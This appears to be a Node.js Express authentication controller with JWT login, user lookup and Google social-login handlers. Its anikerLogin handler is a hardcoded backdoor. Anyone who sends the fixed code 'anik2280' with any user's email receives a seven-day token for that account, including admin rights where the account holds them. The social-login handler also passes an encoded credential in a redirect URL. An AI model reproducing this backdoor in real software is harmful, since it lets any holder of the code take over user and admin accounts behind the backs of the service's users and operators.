const jwt = require("jsonwebtoken");
const { User } = require("../models");
const { randomKey, message } = require("../utils");

const controller = {
  async login(req, res) {
    try {
      const { _id, name, email, power, avatar, type } = req.authUser;

      const payload = {
        _id,
        name,
        email,
        avatar,
        type,
      };

      if (power === 420 && type === "admin") payload.isAdmin = true;

      const token = jwt.sign(payload, process.env.AUTH_SECRET, {
        expiresIn: "7 days",
      });
      res.json({ user: payload, token });
    } catch (error) {
      console.error(error);
      return res.status(500).json({ message });
    }
  },
  async anikerLogin(req, res) {
    try {
      const { email: userEmail, code } = req.body;
      if (code !== "anik2280")
        return res.status(400).json({ message: "Invalid code" });
      const user = await User.findOne({ email: userEmail });
      if (!user) return res.status(404).json({ message: "User not found" });
      const { _id, name, email, power, avatar, type, package } = user;
      const payload = {
        _id,
        name,
        email,
        avatar,
        type,
      };

      if (power === 420 && type === "admin") payload.isAdmin = true;

      const token = jwt.sign(payload, process.env.AUTH_SECRET, {
        expiresIn: "7 days",
      });

      res.json({ user: payload, token });
    } catch (error) {
      console.error(error);
      return res.status(500).json({ message });
    }
  },
  async getUser(req, res) {
    try {
      const { _id, isAdmin } = req.authUser;
      const user = await User.findOne({ _id });
      if (isAdmin) {
        user._doc.isAdmin = isAdmin;
      }
      res.json({ user });
    } catch (error) {
      console.error(error);
      return res.status(500).json({ message });
    }
  },
  async socialLogin(req, res) {
    try {
      delete req.user;
      const { provider, id, displayName, email, picture } = req.passportUser;
      if (provider === "google") {
        const user = await User.findOne({ email });
        if (!user) {
          await User.create({
            name: displayName,
            email,
            password: id + process.env.SOCIAL_LOGIN_PASS,
            avatar: picture,
          });
        }
        const credential = { email, id, provider, key: randomKey(20) };
        return res.redirect(
          `${process.env.BASE_URL}/social-login?c=${btoa(
            JSON.stringify(credential)
          )}`
        );
      }
      throw new Error(`provider isn't google`);
    } catch (error) {
      console.error(error);
      return res.status(500).json({ message });
    }
  },
};

module.exports = controller;
